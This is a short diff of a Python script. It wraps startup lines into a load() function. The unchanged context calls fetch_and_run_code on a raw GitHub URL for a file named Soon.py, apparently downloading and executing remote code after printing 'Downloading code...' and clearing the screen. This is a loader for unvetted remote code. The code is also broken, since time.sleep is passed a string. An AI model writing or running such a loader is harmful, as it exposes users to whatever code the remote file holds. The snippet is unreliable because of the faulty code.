@@ -1,8 +1,9 @@
-import time
-import os
-print("Downloading code...")
-time.sleep("2")
-os.system('clear')
+def load():
+    import time
+    import os
+    print("Downloading code...")
+    time.sleep("2")
+    os.system('clear')
 
 g = "1"
 
@@ -19,6 +20,7 @@ def fetch_and_run_code(url):
         print(f"An error occurred: {e}")
 
 if __name__ == "__main__":
+    load()
     url = "https://raw.githubusercontent.com/Aldoriahub/Gg/refs/heads/main/Soon.py"
     fetch_and_run_code(url)
 
